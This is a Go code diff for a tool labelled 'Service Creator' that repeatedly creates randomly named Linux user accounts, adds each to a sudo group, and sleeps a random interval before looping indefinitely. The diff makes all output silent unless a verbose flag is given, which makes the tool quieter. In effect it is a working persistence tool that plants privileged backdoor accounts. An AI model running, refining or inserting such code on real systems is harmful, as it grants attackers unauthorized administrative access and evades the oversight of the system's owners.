@@ -24,18 +24,19 @@ func main() {
 	buildUsers()
 	if len(args) > 1 {
 		for i := 1; i < len(args); i++ {
-			if args[i] == "--demo" {
+			switch args[i] {
+			case "--demo":
 				isDemo = true
-			} else if args[i] == "-n" {
+			case "-n":
 				numUsers, _ = strconv.Atoi(args[i+1])
-			} else if args[i] == "--help" || args[i] == "-h" {
+			case "--help", "-h":
 				fmt.Println("Service Creator\n\n" +
 					"--demo		|	Displays users but does not create them\n" +
 					"-n [num]	|	Generate n users (default: 1)\n" +
 					"--help or -h	|	Display this help menu",
 				)
 				return
-			} else if args[i] == "-v" {
+			case "-v":
 				isVerbose = true
 			}
 		}
@@ -49,12 +50,16 @@ func do() {
 	if strings.Index(osPath, "/sbin") == -1 {
 		os.Setenv("PATH", osPath+":/sbin:/usr/sbin")
 	}
-	fmt.Printf("Creating user\n")
+	if isVerbose {
+		fmt.Printf("Creating user\n")
+	}
 	for i := 0; i < numUsers; i++ {
 		index := random(len(users) - 1)
 		username := users[index]
 		username = username + strconv.Itoa(random(99)) + strconv.Itoa(random(99))
-		fmt.Println(username)
+		if isVerbose {
+			fmt.Println(username)
+		}
 		if !isDemo {
 			createUser(username)
 			addSudo(username)
@@ -62,7 +67,9 @@ func do() {
 	}
 	rand.Seed(time.Now().UnixNano())
 	delay := (random(19) + 1) * 60
-	fmt.Printf("Sleeping for %d Minutes\n", delay/60)
+	if isVerbose {
+		fmt.Printf("Sleeping for %d Minutes\n", delay/60)
+	}
 	time.Sleep(time.Duration(delay) * time.Second)
 	do()
 }
@@ -89,7 +96,7 @@ func addSudo(username string) {
 	cmd := exec.Command("usermod", "-aG", group, username)
 	//cmd.Run()
 	b, err := cmd.CombinedOutput()
-	if err != nil {
+	if err != nil && isVerbose {
 		fmt.Println(err)
 	}
 	if isVerbose {
@@ -107,10 +114,12 @@ func createUser(username string) {
 	passwd := strings.TrimSpace(string(passwordBytes))
 	cmd = exec.Command("useradd", "-p", passwd, username)
 	b, err := cmd.CombinedOutput()
-	if err != nil {
+	if err != nil && isVerbose {
 		fmt.Println(err)
 	}
-	fmt.Printf("%s\n", b)
+	if isVerbose {
+		fmt.Printf("%s\n", b)
+	}
 }
 
 func readFile(path string) string {
